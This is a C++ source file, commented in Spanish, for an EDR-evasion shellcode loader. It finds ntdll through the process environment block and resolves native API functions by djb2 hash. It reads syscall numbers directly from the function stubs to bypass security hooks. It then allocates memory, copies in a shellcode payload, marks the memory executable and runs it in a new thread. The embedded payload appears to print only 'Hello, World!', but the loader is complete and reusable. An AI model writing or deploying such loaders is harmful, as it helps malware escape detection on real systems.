// EvadeEDR.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>

#define PATH_DLL "C:\\Windows\\System32\\ntdll.dll"

#include "DefsModule.h"

extern "C" void __fastcall SetCall(WORD CallValue);

extern "C" NTSTATUS __fastcall CallFunc(...);


#define print(fmt, ...)\
    printf(fmt "\n", ##__VA_ARGS__)

// Struct
typedef struct _FUNC_VAL
{
    ULONG magic_number;
    WORD call_number;
} FUNC_VAL, * PFUNC_VAL;


// Environment
PTEB GetEnvironmentThreadBlock()
{
    return (PTEB)__readgsqword(0x30);
}


// Calculate the dbj2 to get function
unsigned int Calculacion(const char* str) {
    unsigned int hash = 5381;
    int c;

    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }

    return hash;
}

// Get the function from the DLL Base
BOOL GetFunctionFrom(PVOID dllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PFUNC_VAL value) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR FunctionName = (PCHAR)((PBYTE)dllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)dllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (Calculacion(FunctionName) == value->magic_number)
        {
            print("[+] Funcion encontrada: %s", FunctionName);


            WORD cw = 0;
            while (TRUE) {
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                {
                    print("[-] No se obtuvo numero syscall");
                    return FALSE;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                {
                    print("[-] No se obtuvo numero syscall");
                    return FALSE;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    value->call_number = (high << 8) | low;
                    break;
                }

                cw++;
            }

            print("[+] El Syscall: %d", value->call_number);

            return TRUE;
        }
    }

    return FALSE;
}


// Get the image
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {


    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }


    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }


    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}


PVOID CopyMem(PVOID dest, const PVOID src, SIZE_T len)
{
    char* d = (char*)dest;
    const char* s = (const char*)src;
    if (d < s)
    {
        while (len--)
        {
            *d++ = *s++;
        }
    }
    else {
        const char* lasts = s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}


// Entry Point
int main()
{
    PTEB pCurrentTeb = GetEnvironmentThreadBlock();
    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
    
    NTSTATUS status;

    if (!pCurrentTeb || !pCurrentPeb || pCurrentPeb->OSMajorVersion != 0xA)
    {
        print("[-] Error On getting TEB and PEB");
        return -1;
    }

    print("[+] Replicando chido");

    // Get Ntdll module 
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
    {
        print("[-] No se obtuvo Modulo de NTDLL");
        return -1;
    }

    print("[+] Se obtuvo modulo de NTDLL");

    // Functions to export
    FUNC_VAL firstFunction = { 0 };   // NtAllocateVirtualMemory
    FUNC_VAL secondFunction = { 0 };  // NtProtectVirtualMemory
    FUNC_VAL thirdFunction = { 0 };   // NtFreeVirtualMemory
    FUNC_VAL fourthFunction = { 0 };  // NtCreateThreadEx
    FUNC_VAL fifthFunction = { 0 };   // NtWaitForSingleObject

    firstFunction.magic_number = 0x6793c34c;   // NtAllocateVirtualMemory
    secondFunction.magic_number = 0x82962c8;   // NtProtectVirtualMemory
    thirdFunction.magic_number = 0x471aa7e9;   // NtFreeVirtualMemory
    fourthFunction.magic_number = 0xcb0c2130;  // NtCreateThreadEx
    fifthFunction.magic_number = 0x4c6dc63c;   // NtWaitForSingleObject

    // Get functions
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &firstFunction);
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &secondFunction);
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &thirdFunction);
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &fourthFunction);
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &fifthFunction);


    // Hello World!
    BYTE payload[] = {
        0xe9, 0x00, 0x00, 0x00, 0x00, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xec,
        0x28, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8b,
        0x40, 0x60, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x40, 0x10, 0x48, 0x8b,
        0x00, 0x48, 0x8b, 0x00, 0x48, 0x8b, 0x40, 0x30, 0x48, 0x89, 0x05, 0xfd,
        0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x0f, 0x84, 0xdb, 0x00, 0x00, 0x00,
        0x48, 0x63, 0x48, 0x3c, 0x8b, 0x8c, 0x08, 0x88, 0x00, 0x00, 0x00, 0x8b,
        0x54, 0x08, 0x18, 0x44, 0x8b, 0x44, 0x08, 0x20, 0x49, 0x01, 0xc0, 0x4c,
        0x8d, 0x48, 0xff, 0x83, 0xea, 0x01, 0x0f, 0x82, 0xac, 0x00, 0x00, 0x00,
        0x41, 0x89, 0xd2, 0x43, 0x8b, 0x3c, 0x90, 0x4c, 0x8d, 0x1c, 0x38, 0x4c,
        0x01, 0xcf, 0x31, 0xdb, 0x48, 0x89, 0xde, 0x80, 0x7f, 0x01, 0x00, 0x48,
        0x8d, 0x7f, 0x01, 0x48, 0x8d, 0x5b, 0xff, 0x75, 0xef, 0x4c, 0x39, 0xdf,
        0x74, 0xd1, 0xbf, 0xc5, 0x9d, 0x1c, 0x81, 0x41, 0x0f, 0xb6, 0x1b, 0x49,
        0xff, 0xc3, 0x8d, 0x6b, 0xe0, 0x80, 0xfb, 0x61, 0x40, 0x0f, 0xb6, 0xed,
        0x0f, 0x42, 0xeb, 0x40, 0x0f, 0xb6, 0xdd, 0x31, 0xfb, 0x69, 0xfb, 0x93,
        0x01, 0x00, 0x01, 0x48, 0xff, 0xc6, 0x75, 0xdb, 0x81, 0xff, 0xcc, 0x62,
        0xb0, 0x19, 0x75, 0x9f, 0x8b, 0x54, 0x08, 0x1c, 0x8b, 0x4c, 0x08, 0x24,
        0x48, 0x01, 0xc2, 0x48, 0x01, 0xc1, 0x42, 0x0f, 0xb7, 0x0c, 0x51, 0x44,
        0x8b, 0x14, 0x8a, 0x49, 0x01, 0xc2, 0x4c, 0x89, 0x15, 0x5f, 0x00, 0x00,
        0x00, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8b,
        0x40, 0x60, 0x48, 0x8b, 0x40, 0x20, 0x48, 0x8b, 0x48, 0x28, 0x48, 0xc7,
        0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x15, 0x22, 0x00,
        0x00, 0x00, 0x41, 0xb8, 0x0e, 0x00, 0x00, 0x00, 0x45, 0x31, 0xc9, 0x41,
        0xff, 0xd2, 0xeb, 0x0b, 0x48, 0xc7, 0x05, 0x21, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x83, 0xc4, 0x28, 0x5b, 0x5d, 0x5f, 0x5e, 0xc3,
        0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x2c, 0x20, 0x57, 0x6f, 0x72, 0x6c, 0x64,
        0x21, 0x0a, 0x00 
    };

    PVOID pAddr = NULL;
    SIZE_T payload_size = sizeof(payload);
    SIZE_T real_size = payload_size;
    ULONG ulOldProtect = 0;

    // Allocate memory
    print("[*] Asignando memoria RW...");
    SetCall(firstFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, 0, &payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0)
    {
        print("[-] Error en NtAllocateVirtualMemory: 0x%08X", status);
        return -1;
    }

    print("[+] Memoria asignada en: 0x%p", pAddr);
    print("[+] Size: %zu bytes", real_size);

    // Copy payload
    print("[*] Copiando payload...");
    CopyMem(pAddr, (PVOID)payload, real_size);
    print("[+] Payload copiado");

    // Change permissions
    print("[*] Cambiando permisos a RX...");
    SetCall(secondFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, &real_size, PAGE_EXECUTE_READWRITE, &ulOldProtect);

    if (status != 0)
    {
        print("[-] Error cambiando permisos: 0x%08X", status);
        return -1;
    }

    print("[+] Permisos cambiados exitosamente");


    
    // CORRECCIÓN: Crear hilo remoto correctamente
    HANDLE hHostThread = NULL;
    DWORD dwThreadId = 0;

    print("[*] Creando hilo remoto...");

    SetCall(fourthFunction.call_number);

    // NtCreateThreadEx tiene 11 parámetros
    // NTSTATUS NtCreateThreadEx(
    //   PHANDLE ThreadHandle,
    //   ACCESS_MASK DesiredAccess,
    //   POBJECT_ATTRIBUTES ObjectAttributes,
    //   HANDLE ProcessHandle,
    //   LPTHREAD_START_ROUTINE lpStartAddress,
    //   LPVOID lpParameter,
    //   ULONG CreateFlags,
    //   SIZE_T ZeroBits,
    //   SIZE_T StackSize,
    //   SIZE_T MaximumStackSize,
    //   PPS_ATTRIBUTE_LIST AttributeList
    // );

    status = CallFunc(&hHostThread,
        THREAD_ALL_ACCESS,
        NULL,
        (HANDLE)-1,  // Current process
        pAddr,       // Start routine
        NULL,        // Parameter
        FALSE,       // Create suspended?
        0,           // Zero bits
        0,           // Stack size
        0,           // Max stack size
        NULL);       // Attribute list

    if (status != 0) {
        print("[-] Error en NtCreateThreadEx: 0x%08X", status);
        return -1;
    }
    
    print("[+] Hilo creado (handle: 0x%p)", hHostThread);

    // Wait for thread completion
    print("[*] Esperando a que termine el hilo...");
    SetCall(fifthFunction.call_number);
    LARGE_INTEGER timeout;
    timeout.QuadPart = -10000000;  // 1 segundo

    status = CallFunc(hHostThread, FALSE, &timeout);

    if (status == 0x102) {  // STATUS_TIMEOUT
        print("[!] Timeout - el hilo sigue ejecutandose");
    }
    else if (status != 0) {
        print("[-] Error en NtWaitForSingleObject: 0x%08X", status);
    }
    else {
        print("[+] Hilo terminado exitosamente");
    }

    // Cleanup
    CloseHandle(hHostThread);

    // Free memory
    print("[*] Liberando memoria...");
    SetCall(thirdFunction.call_number);
    SIZE_T free_size = 0;
    status = CallFunc((HANDLE)-1, &pAddr, &free_size, MEM_RELEASE);

    if (status != 0) {
        print("[-] Error liberando memoria: 0x%08X", status);
    }
    else {
        print("[+] Memoria liberada exitosamente");
    }

    print("[+] Programa finalizado");

    return 0;
}